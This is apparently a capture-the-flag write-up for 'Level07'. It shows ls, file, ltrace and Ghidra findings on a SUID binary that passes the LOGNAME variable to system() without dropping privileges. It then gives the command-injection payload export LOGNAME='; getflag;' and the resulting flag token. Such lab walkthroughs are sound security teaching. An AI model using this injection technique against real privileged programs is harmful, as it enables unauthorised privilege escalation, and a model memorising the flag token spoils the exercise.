Level07:

- Discovered: SUID binary located in home directory.
  Ran: ls -l level07
  Output:
    -rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
    → Owned by flag07 with SUID and SGID bits set

- Confirmed it’s a 32-bit SUID binary:
  Ran: file level07
  Output:
    ELF 32-bit, dynamically linked, not stripped

- Dynamic analysis:
  Ran: ltrace ./level07
  Observed:
    - getenv("LOGNAME")
    - asprintf(&buffer, "/bin/echo %s", LOGNAME)
    - system(buffer)

- Observed privilege logic from Ghidra:
  Decompiled flow:
    local_18 = getegid();            → returns flag07
    local_14 = geteuid();            → returns flag07
    setresgid(local_18, ...)         → sets GID to flag07 (not dropping)
    setresuid(local_14, ...)         → sets UID to flag07 (not dropping)

- Key insight:
  - This does NOT drop privileges.
  - It reaffirms UID/GID to flag07
  - `system()` runs as flag07 and executes shell commands built from user-controlled env var

- Exploit used: environment variable injection
  Payload:
    export LOGNAME="; getflag;"
    ./level07

  - This causes system() to run:
    /bin/sh -c "/bin/echo ; getflag;"
  - Result:
    getflag is executed with flag07 privileges

- Output:
  Check flag.Here is your token : fiumuikeil55xe9cu4dood66h > level08
